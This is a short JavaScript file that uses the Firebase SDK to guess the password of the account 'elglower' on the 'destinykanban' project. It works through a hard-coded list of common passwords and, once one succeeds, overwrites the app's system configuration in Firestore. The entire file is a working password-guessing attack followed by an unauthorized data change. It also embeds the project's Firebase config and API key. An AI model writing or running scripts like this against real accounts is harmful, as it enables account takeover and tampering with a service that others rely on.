import { initializeApp } from "firebase/app";
import { getAuth, signInWithEmailAndPassword } from "firebase/auth";
import { getFirestore, doc, setDoc } from "firebase/firestore";

const firebaseConfig = {
  apiKey: "AIzaSyCfzq2_PfLSyhG5cRZz4KtYr-Kd29FPLMM",
  authDomain: "destinykanban.firebaseapp.com",
  projectId: "destinykanban",
  storageBucket: "destinykanban.firebasestorage.app",
  messagingSenderId: "697873311825",
  appId: "1:697873311825:web:f3a6944f55d592e6ccf070",
  measurementId: "G-8NQKJPTZDW"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

const username = "elglower";
const email = `${username}@destinykanban.local`;

const commonPasswords = [
  "elglower",
  "admin",
  "destiny",
  "destino",
  "123456",
  "12345",
  "1234",
  "password",
  "destinyowner",
  "destinykanban"
];

async function tryLogin() {
  for (const rawPassword of commonPasswords) {
    const paddedPassword = rawPassword.length >= 6 ? rawPassword : rawPassword.padEnd(6, "_");
    try {
      console.log(`Trying password: "${rawPassword}" (padded: "${paddedPassword}")`);
      await signInWithEmailAndPassword(auth, email, paddedPassword);
      console.log(`SUCCESSFUL LOGIN with password: "${rawPassword}"`);
      
      // Update system/config
      const docRef = doc(db, "system", "config");
      await setDoc(docRef, { latestVersion: "1.1.1" }, { merge: true });
      console.log("SUCCESS: Firestore system/config updated to 1.1.1");
      return;
    } catch (err) {
      // Continue trying
    }
  }
  console.log("FAILED to log in with any common password.");
}

tryLogin();
